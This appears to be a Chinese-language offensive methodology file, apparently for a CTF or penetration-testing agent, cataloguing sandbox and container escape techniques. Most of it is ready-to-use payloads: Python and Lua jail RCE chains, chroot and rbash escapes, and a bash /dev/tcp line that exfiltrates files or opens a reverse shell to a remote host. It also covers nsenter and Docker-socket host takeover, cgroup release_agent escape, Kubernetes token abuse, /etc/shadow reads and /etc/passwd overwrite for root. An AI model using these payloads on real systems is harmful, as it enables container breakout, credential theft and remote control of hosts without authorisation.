# 沙箱逃逸 — pyjail / bash jail / Lua / chroot / namespace / rbash

> 目标处于受限执行环境（语言沙箱/文件系统隔离/受限 shell）需要逃逸时加载。
> seccomp（二进制 syscall 沙箱）见 `pwn-methodology.md` 步骤 3; 浏览器沙箱见 browser 相关分析。

## 触发条件

- Python/Lua 代码在受限环境执行（builtins 被清/模块被移除/关键字被滤）
- 文件系统被 chroot/容器隔离，需访问真实根
- 登录后拿到受限 shell（rbash/自定义 wrapper）

## §0 jail 识别分诊

- **pyjail 错误模式**: `name not allowed`=标识符黑名单→Unicode 全角/hex; `unknown function`=白名单→单字符爆破 `for c in printable: test(f"{c}(65)")`; `node not allowed`=AST→换等价语法; `binop types`=类型限制
- **bash jail**: 逐字符探测（`$#X$#`——静默拒=过滤/有报错=过）; 尾随 `\` 出 `unexpected EOF`=双引号 eval（`\$`=字面 $/`$#`→0/`\$$#`→$0→bash）; 无 EOF=裸 eval; `read -r` 保留反斜杠、无 -r 剥离
- 多次提交场景: payload 分段存类属性 `subclasses()[-2].payload` 跨 eval 持久

## §1 Python 沙箱（pyjail）

**子类漫游**: `().__class__.__bases__[0].__subclasses__()` 从任意字面量到全部已加载类（等价起点 `''.__class__.__mro__[1]` 等）。目标类: `os._wrap_close`（`__init__.__globals__['system']`）/ `warnings.catch_warnings`（恢复 __builtins__）/ `subprocess.Popen` / `codecs.IncrementalDecoder`（globals 入口）/ `BuiltinImporter.load_module('os')`。索引版本相关，现场枚举 `for i,cls in enumerate(...): if 'wrap_close' in str(cls)`。

**字符/关键字过滤**: 拼串 `'__imp'+'ort__'` / getattr 计算串 / chr() 逐字 / hex-unicode 转义 / base64。引号滤→chr/bytes; 点滤→getattr/`__getattribute__`; **括号滤→装饰器 `@exec @input class X: pass`**（input 读入+exec 求值）/ `__init_subclass__(cmd=...)` 继承触发 / `__class_getitem__ = staticmethod(exec)` 下标触发。
**无 open 读文件**: pathlib.Path().read_text / os.read(os.open()) / codecs.open / urllib file:// / linecache.getlines / help() globals。

**AST 解析型沙箱**: 节点黑名单→等价物: Import 拦→`__import__()`; Call 拦→装饰器/`__init_subclass__`/实例化副作用; Attribute 拦→getattr; Subscript 拦→`__getitem__`; 全表达式拦→f-string 内嵌。RestrictedPython（Plone/Zope）: `_getattr_` 包装→找不经包装路径; `_getiter_`→map/filter; 导入拦→BuiltinImporter。**code object 构造**: types.CodeType 手工字节码 或 compile 后替换 co_code/co_consts/co_names 再 exec。

**装饰器链完整体系**（无调用/引号/=/逗号场景）: `@expr def n():0`=`n=expr(f)` 无 Call 无赋值。三组件: ①`def exec():0` 的 `exec.__name__` 当字符串键 ②`function.__dict__['__name__'].__get__` getset_descriptor 提名 ③`__loader__.load_module.__func__.__globals__["__builtins__"]` 真实内建。无 \_\_loader\_\_: 任意 f→`f.__globals__["__builtins__"]`/类 C→`C.__init__.__globals__`。

**约束变量与编码层**: walrus `(allowed := "全集")` 重赋约束变量; 八进制 `'\141\142'` 构串; magic comment `# -*- coding: raw_unicode_escape -*-` 头后整文件按该编码解析（utf-7/rot_13 同理）。

**oracle 型**: L()/Q(i,x)/S() 接口——二分或线性逐位; mastermind "a b" 输出（a=错位数/b=对位数）三步: 长度试长/字符集 c×LEN/逐位 known+c+'Z' 填充看 b 增。

**服务端拼接注入**: `eval("your."+input+"()")` 型——逗号造元组破出（`dig(),eval(name),`）; \\x5f 绕下划线; payload 预存变量再 eval(name)（存引分离）; f-string 键名位求值——键名写 `eval(a)` 渲染时执行。

**上下文与构造**: quine 双用途（`s='s=%r;...';print(s%s,end="")` + `"subprocess" in globals()` 门控主进程才触发）; repunit 1/+ 贪心分解任意整数喂 long_to_bytes 双 eval; 数字禁时 `[]<[]`=0/`{}<[]`=1/~/<< 递归构造（brainfuckize）+`"%c"%n` 构串; 对象泄漏: `f.__code__.co_consts`（函数内字面量）/ name mangling `dir(obj)` 索引绕（"过滤看字面量还是值"）/ `module.__doc__` 兜底读/模块链 `catch_warnings.__init__.__globals__["linecache"].__dict__["os"]`。补（misc field-notes）: `gc.get_referents()` 遍历引用图泄闭包/对象; `__build_class__` 当跳板访 `__self__`; `\x0c` form feed 等非常规空白绕过滤; 高级路线 CPython UAF——搜已知内存安全 CVE+`__index__` 魔术方法触发隐式转换、audit hook 在栈上可被 UAF 清除（**版本必须精确匹配**）。

**环境变量 RCE**: `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="/bin/sh -c 'cmd' %s"`; PYTHONSTARTUP/PYTHONPATH（伪模块抢先）/PYTHONINSPECT（落交互 shell）。

pickle 反序列化逃逸见 deserialization 体系。

**自定义指令集/汇编语言沙箱**（PROP/CALL 型）: 自定义 ISA 但宿主是 Python 时走 MRO 链——`PROP __class__`→`PROP __base__`→`PROP __subclasses__`+`CALL`→IDX 选 os._wrap_close→`PROP __init__`→`PROP __globals__`→builtins。通用五步: ①读 /docs /help /api 找指令参考 ②找结果寄存器 ③字符串 hex 编码（0x666c61672e747874→"flag.txt"）绕关键字过滤 ④MRO 链到 RCE（同 Jinja2 SSTI）⑤故意报错泄漏 Python 内部类清单。

## §2 Lua 沙箱

- debug 库残留（最常见疏漏）: `debug.getregistry()` 直达全局注册表; `debug.getupvalue/setupvalue` 读改闭包 upvalue（遍历已知函数找 os/io 引用）
- `loadstring("os.execute('sh')")()`（Lua 5.1 = load 别名）; string.dump 可用时 dump→patch→load
- **按名过滤盲区三 alias**: 表索引 `os["execute"]`（滤调用不滤查表）/ 字符串拼名 `os["exe".."cute"]` / 换库 `io.popen("cmd"):read("*a")`
- metatable 链伪造（rawset 被禁但 `__index/__newindex` 在）
- **LuaJIT FFI 一步到 C**: `ffi.cdef[[int system(const char*);]] ffi.C.system("sh")`; require 被禁时从 package.loaded / debug.getregistry() 找 ffi

## §2a Ruby 沙箱

- `set_trace_func` 监控型沙箱 → `TracePoint.trace(:c_call) { system('sh') }`——C 层事件钩子先于 Ruby 级事件分发触发，监控来不及拦; 任意后续 C 方法调用（puts 等）引爆
- 审计顺序: 先看沙箱监控用什么层（Ruby 层钩子→TracePoint 先手）; 检查 TracePoint 是否被封

## §2b C 代码 jail——emoji 构数+常量嵌 gadget

## §2c JS eval 白名单正则逃逸

白名单正则（如只放行 `Math(\.\w+)?/运算符/数字/空格`，replace 后非空即拒）三要素: ①**参数名遮蔽**——`(Math=>...)(Math+1)` 箭头函数自调用，参数名 Math 遮蔽全局（正则匹配字面量不查变量绑定）; ②**constructor 取 Function**——闭包内 `Math=Math.constructor` 重绑为 Function; ③**fromCharCode 构串**——`Math.constructor(Math.fromCharCode(114,...))()` 目标代码逐字符 ord 数字序列免字符串字面量。配套: md5(a+key)===md5(b+key) 且 a!==b 且 length 等校验用 JSON `"first":"1","second":[1]`（+ 拼接时数组 toString 归一化）。vm 沙箱 this.constructor.constructor 同族。

- 禁字母数字/引号/多数运算符（仅 `(){}[];,=.+*%@#~`+emoji）时: GCC emoji 合法标识符→`(😃==😃)`=编译期 1，加乘构造任意整数
- **add eax,imm32 嵌 gadget**: -O0 下 `var=var+CONST` 编码 `05 XX XX XX XX`——常量 4 字节即机器码，跳 offset+1 执行: `0f 05 c3`(syscall;ret)=12780815、`5f c3`(pop rdi;ret)=50015、`54 5e 0f 05`(push rsp;pop rsi;syscall)=84893268
- `push rsp;pop rsi;syscall` 当 sys_read 把输入读到栈返回地址处→直接装载 ROP 链（mprotect+read+shellcode，glob `cat /flag*` 适配未知路径）
- 前提 `-static -nostartfiles -nostdlib`: 无 ASLR，函数地址确定。同族: 常量摘要拼接/ 字母数字 shellcode

## §3 chroot 逃逸

| 方法 | 前提 | 操作 |
|---|---|---|
| **double chroot** | 内部 root | `mkdir x; chroot x`（旧 CWD 出新根）→ `chdir("..")×100` → `chroot(".")` → sh。原理: chroot 只改根解析，CWD inode 链不变 |
| fd 泄漏 | 外界 fd 未关 | `fchdir(fd); chroot(".")` |
| /proc 挂载 | /proc 可访问 | `/proc/1/root/` 直读真实根（/etc/shadow 等）|
| TIOCSTI | fd 0 是 TTY | `ioctl(0, TIOCSTI, &c)` 向 chroot 外父 shell 注入击键 |
| ptrace / mount ns | CAP_SYS_PTRACE / 特权 | attach 外部进程 / mount 真实根进来 |

审计: chroot 非安全边界（仅路径隔离设计）——必查 root+fd 泄漏+/proc 三面。

## §4 namespace/容器

```bash
ls /proc/1/root/        # /proc 来自宿主时直读宿主文件系统（最快 win）
cat /proc/1/root/etc/shadow
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash   # 进 PID 1 全部 ns → 宿主 shell
unshare -Urm            # 非特权 user+mount ns，内部假 root（可 mount/FUSE）
```
判定顺序: /proc/1/root → docker.sock/caps（capsh --print）→ privileged（mount 宿主盘/装内核模块）→ 内核漏洞。docker socket/K8s API 未认证面见 internal-pentest-methodology.md §2。

**K8s RBAC 链**: SA token（/var/run/secrets/kubernetes.io/serviceaccount/token）→ `kubectl auth can-i --list` 验 impersonate 权 → 建 pod 挂 hostPath `/` → 读节点 kubeconfig（k3s: /etc/rancher/k3s/k3s.yaml）→ 节点凭据读任意 namespace secrets。

**Docker 逃逸三路**: 优先级 `--privileged` > docker.sock > caps（capsh --print）> 泄漏面。①privileged: fdisk -l→mount /dev/sda1 /mnt/host→chroot; ②docker.sock（CLI 不可用走 API）: `curl --unix-socket /var/run/docker.sock -X POST .../containers/create -d '{"Image":"alpine","Binds":["/:/mnt"],"Privileged":true}'`; ③CAP_SYS_ADMIN: cgroup release_agent——mount -t cgroup -o rdma → notify_on_release=1 → /etc/mtab 提 upperdir 宿主路径写 release_agent → echo $$ > cgroup.procs 触发宿主命令。泄漏四路: /proc/self/cgroup（容器 ID）/proc/mounts（upperdir 宿主路径）/sys/kernel/slab/*/cgroup/（他容器 ID）/proc/1/environ。

## §5 rbash 受限 shell

| 载体 | 命令 |
|---|---|
| vi/vim | `:!/bin/bash` 或 `:set shell=/bin/bash` + `:shell` |
| less/more | `!/bin/bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| find | `find / -exec /bin/bash \;` |
| python | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| ssh | `ssh user@host -t /bin/bash`（-t 强制 TTY）|
| git | `git help config` pager 内 `!/bin/bash` |
| PATH 限制 | `export PATH=/usr/bin:/bin` |
| 白名单匹配 | `echo <b64> \| base64 -d \| sh` |
| 受限 vim | K 键→man→less→`!sh`; 先查 `:set keywordprg?`/secure/`LESSSECURE=1`（缺失即绿灯）; 审计一切 spawn 子进程命令（K/:grep/:make/gx） |
| rvim（restricted vim） | `:python3 import os; os.system("cmd")`（`:py3` 同）——rvim 只封 `:!`/`:shell`，脚本接口未封; `:version` 查 `+python3/+lua/+ruby` 任一在即逃逸。自定义 vimrc 路径: `rvim -u /tmp/evil_vimrc` 在限制完全应用前执行 vimrc 内容（sudo -u 场景即目标用户命令执行） |
| vim normal-mode 原语（: 被封） | `CTRL-W F` 开 netrw 文件浏览器读任意文件（j/k 导航+Enter 读入）; `K` 关键字开 man 页（内 `!` 得 shell）; `gF` 同族。审 vim 沙箱先试这三件 ex 命令外原语 |

枚举: `sudo -l` / `compgen -c` / `ls /usr/bin` → 按表试。本质: 任何带"执行外部命令"能力的程序（编辑器/pager/解释器/VCS）都是逃逸点。

**读文件三法（无 cat/less）**: `HISTFILE=/flag /bin/bash` + history（文件进历史表）/ `bash -v flag.txt`（执行前逐行打印，注释行无错）/ ctypes.sh `dlcall open/mmap/printf`。

**构造体系**: 构数 `$#`=0/`${##}`=1/`$((++a))` 未初始化=0; 构串 `$'\101'` 八进制（`__=$'\057\147...'`）/ `${VAR:off:len}` 环境变量子串拼命令; 极简 `#$\` 三字符 `\$$#`→$0→bash; echo-only 逐层升级（算术→八进制字节→任意命令）。**无字母源补充**（misc field-notes）: 错误信息产字母——`_1=\`$ 2>&1\`` 的 "command not found" 是字母源，`${var:offset:length}` 切片提取所需字符; 通配 `./\*/????.???` 匹配路径当命令。

**环境过滤盲区**: rbash 过滤 argv 不过滤 `VAR=value cmd` 前缀——`LD_PRELOAD=/tmp/hook.so cat`（constructor system RCE）; 防御须 unset LD_PRELOAD/LD_LIBRARY_PATH/LD_AUDIT。

**出网**: /dev/tcp 是 bash 内建虚拟路径——`cat flag > /dev/tcp/host/port` 外带 / `exec 3<> /dev/tcp/host/port; cat <&3 | bash >&3 2>&3` 反弹——nc/curl 全缺也能出网。

**关闭 stdout**: 命令成功无输出=stdout 关——`cat flag 1>&0`（stdin=网络 socket 恒开）/`exec 1>&0` 持久; 文件 `\r` 截断显示——`cat -A`(^M)/`od -c`/`base64` 零损失输出。

**逃逸后**: `/proc/*/cmdline` grep flag 找内部服务（socat EXEC:cat /flag 本机连 `cat < /dev/tcp/127.0.0.1/PORT`/readflag SUID/root 进程环境）; 提权清单: SUID→getcap→内部服务→PATH 可写→容器标志。

## §6 沙箱校验与模拟器注入面

**FUSE/CUSE 后门设备**: 设备 handler 跑用户态 daemon（常 root）——write handler 暴露 cmd:file:mode 命令接口时任何可写设备文件的用户得 root 操作: `echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor`（511=0777）→ passwd 去 root 哈希 su 免密。识别: cuse_lowlevel_main/fuse_main+DEVNAME。受限环境兜底: 任意写 /etc/passwd 或 /etc/sudoers(NOPASSWD) 即 root; `exec <&3; sh >&3 2>&3` 经现有连接拿交互 shell（网络服务器客户端常在 fd 3，免出站）。

**文件层检查绕过两式**: ① "任意文件+偏移写"服务打 `/proc/self/mem`——随机读写进程虚拟内存**绕过 mmap 页保护**（只读代码段可写，等效 POKETEXT），写 shellcode 到已知地址注入 ② stat() 预检大小的二进制用 **mkfifo**——FIFO 的 st_size 恒 0 但 read 交付任意长: `mkfifo /tmp/p; cat payload > /tmp/p & ./vuln /tmp/p`。共性: 两层语义落差（stat vs read、open vs 页表写）。

**沙箱 fail-open 与指令级 filter 盲区**: ① supervisor 用 process_vm_readv+realpath 校验路径——被检进程 mmap PROT_READ-only 固定地址放路径，读取**静默失败被当放行**（校验器只写成功/拒绝两分支）② Unicorn hook 只拦 `int 0x80`——`sysenter` 快速入口不触发 INT hook（同族 syscall/int 0x2e）; 黑名单漏等价号: dup3/openat/pread64/sendfile（openat→sendfile(1,fd,0,len) 全程避名单）。

**模拟器/VM 注入面**: ① PRINT 用 `eval('"'+buf+'"')` 处理转义——ADD opcode 逐字节构造 `"+__import__("os").system("cmd")#`（引号闭合+注释截断）② VM swap(a,b) 不验 sp 界——`swap(-1,0)` 把栈指针自身当 stack[-1] 交换→sp_nxt 受控→push 落任意地址。共性: 模拟器信任自身内部状态（内存/栈指针）——状态本身当攻击面。

**execute-only 文件 dump**: 文件权限 --x（无读位）挡文件读取但不挡执行——内核仍完整映射。LD_PRELOAD 的 `__attribute__((constructor))` 在 main 前进程内跑，解析 /proc/self/maps 定位映射区间后经 /proc/self/mem 读出 dump。同通道反向亦可用于注入（经 /proc/self/mem 向进程写入），此处是 dump 用途。

**调试接口状态混用**: 模拟器 /load 只换 ROM 不重置 CPU 状态（寄存器/RAM/PC 保留）——ROM_A 加载秘密进 RAM 后单步到固定 PC，/load ROM_B（同 PC 处有 display 指令）继续执行即输出 A 的秘密。识别: /load /step /dump 命令+多 ROM 文件。

**信息流/taint 类型系统绕过**: ML 风格语言 if 表达式密级取返回类型非条件——条件读私有数据+分支操作 public ref 照样过检（逐 bit 比较+扣减经 public ref 汇聚泄漏）; 函数副作用经类型强转 `(fn ... :> private unit) :> private (int->private unit)` 藏签名后。检查器只看标签一致性不看数据流。

## §7 关联文件

- `$SHARED_DIR/knowledge-base/pwn-methodology.md` — seccomp 体系（步骤 3）
- `$SHARED_DIR/knowledge-base/internal-pentest-methodology.md` — 内网横向
